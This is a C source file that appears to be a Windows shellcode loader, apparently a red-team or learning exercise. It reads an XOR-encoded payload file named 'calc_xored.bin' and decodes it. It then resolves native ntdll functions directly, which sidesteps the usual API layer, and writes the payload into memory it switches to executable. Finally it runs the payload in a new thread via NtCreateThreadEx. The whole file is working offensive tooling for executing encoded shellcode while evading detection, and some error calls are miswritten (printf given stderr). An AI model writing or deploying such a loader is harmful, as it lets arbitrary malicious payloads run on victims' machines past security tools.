#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtFreeVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);
typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI *PUSER_THREAD_START_ROUTINE)(
    _In_ PVOID ThreadParameter
    );

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI *NtClose_t)(
   HANDLE Handle
);

typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, 
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

void read(const char *filename, char **buffer, int *fileLen) {
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        fprintf(stderr, "Could not open file %s\n", filename);
        exit(1);
    }

    fseek(file, 0, SEEK_END);
    *fileLen = ftell(file);
    fseek(file, 0, SEEK_SET);

    *buffer = (char *)malloc(*fileLen);
    if (*buffer == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        fclose(file);
        exit(1);
    }

    fread(*buffer, 1, *fileLen, file);
    fclose(file);
}

void xor(char *buffer, int fileLen) {
    for (int i = 0; i < fileLen; i++) {
        buffer[i] ^= 1;
    }
}

int main() {
    char *buffer;
    int fileLen;
    DWORD oldProtect;

    read("calc_xored.bin", &buffer, &fileLen);

    printf("File contents:\n");
    for (int i = 0; i < fileLen; i++) {
        printf("%02x ", (unsigned char)buffer[i]);
    }
    printf("\n");

    xor(buffer, fileLen);

    printf("File content after unXORing:\n");
    for (int i = 0; i < fileLen; i++) {
        printf("%02x ", (unsigned char)buffer[i]);
    }
    printf("\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf(stderr, "Error loading ntdll.dll\n");
        free(buffer);
        return EXIT_FAILURE;
    }

    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetProcAddress(hNtdll, "NtFreeVirtualMemory");
    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");
    NtClose_t NtClose = (NtClose_t)GetProcAddress(hNtdll, "NtClose");
    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtFreeVirtualMemory || !NtCreateThreadEx) {
        printf(stderr, "Error getting function addresses\n");
        free(buffer);
        return EXIT_FAILURE;
    }

    PVOID exec = NULL;
    SIZE_T size = fileLen;
    NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status < 0) {
        printf(stderr, "Error allocating memory: 0x%x\n", status);
        free(buffer);
        return EXIT_FAILURE;
    }

    memcpy(exec, buffer, fileLen);

    status = NtProtectVirtualMemory(GetCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, &oldProtect);
    if (status < 0) {
        printf(stderr, "Error changing memory protection: 0x%x\n", status);
        NtFreeVirtualMemory(GetCurrentProcess(), &exec, &size, MEM_RELEASE);
        free(buffer);
        return EXIT_FAILURE;
    }

    HANDLE threadHandle = NULL;
    status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)exec, NULL, 0, 0, 0, 0, NULL);
    if (status < 0) {
        printf(stderr, "Error creating thread: 0x%x\n", status);
        NtFreeVirtualMemory(GetCurrentProcess(), &exec, &size, MEM_RELEASE);
        free(buffer);
        return EXIT_FAILURE;
    }

    WaitForSingleObject(threadHandle, INFINITE);
    NtClose(threadHandle);

    NtFreeVirtualMemory(GetCurrentProcess(), &exec, &size, MEM_RELEASE);
    free(buffer);

    return 0;
}
